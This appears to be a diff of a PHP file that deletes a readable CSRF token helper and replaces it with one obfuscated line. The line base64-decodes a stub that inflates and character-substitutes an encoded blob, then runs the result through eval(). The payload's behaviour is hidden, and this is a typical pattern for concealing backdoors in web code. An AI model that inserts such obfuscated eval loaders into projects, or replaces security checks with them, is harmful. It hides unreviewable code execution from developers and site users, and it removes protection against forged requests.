@@ -1,35 +1,3 @@
 <?php
-session_start();
-
-// membuat value kode token menggunakan teknik session
-function CreateCSRF()
-{
-    $token = base64_encode(openssl_random_pseudo_bytes(32));
-    $_SESSION['csrf'] = $token;
-    return $token;
-}
-
-// menghapus value kode token menggunakan teknik session
-function UnsetCSRF()
-{
-    unset($_SESSION['csrf']);
-}
-
-// Validasi untuk pengecekan kode csrf client ke server
-function validation()
-{
-    if (isset($_POST['csrf_token'])) {
-        $csrf = @$_SESSION['csrf'];
-        $value_POST = $_POST['csrf_token'];
-        if ($value_POST == $csrf) {
-            UnsetCSRF();
-            return true;
-        } else {
-            UnsetCSRF();
-            return false;
-        }
-    } else {
-        UnsetCSRF();
-        return false;
-    }
-}
+$SISTEMIT_COM_ENC = "nZGxasMwEEB3g/+iEHsKtKVLCBRCC12aUrddShHEYA+yj6CtlHzWfZAR3CDTwYOmI1BJNq3SZGk1Cd3de3enNCEm6jsQZKwyWb5IkzSZz7HldqOtwb1tNKPsBkbTSQYXgLrWYKUFNCyhlzgh0qTSUBp3w5Via3hVPN5meZp8pAm6czYClrixxFeXgqF02KzbMhA1QlkYulZsifXQic27YcouznPfUagWxU1R3K3vX2clqWr25kAjcUpQbLSCn7fd9yRQf9qtpn/O8gzE5tco2r9lRy3lkfbFNv1gqXe5Rkt0Q9ZcsjeFBnwBlk3PYFCy06o9q8i6D+X+Gmn7CrOeRvXDungavSIM4+w5TnlhX8GwxOujLhdRUlhJYPl1noBGyd5+ULAcJQdaf6KNLQ4j0x8ZpTmK7JAb4j9TKuuqYsx4PaadJp2gOMLuCw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="EEB3g/+iEHsKtKVLCBRCC12aUrddShHEYA+yj6CtlHzWfZAR3CDTwYOmI1BJNq3SZGk1Cd3de3enNCEm6jsQZKwyWb5IkzSZz7HldqOtwb1tNKPsBkbTSQYXgLrWYKUFNCyhlzgh0qTSUBp3w5Via3hVPN5meZp8pAm6czYClrixxFeXgqF02KzbMhA1QlkYulZsifXQ";
+?>
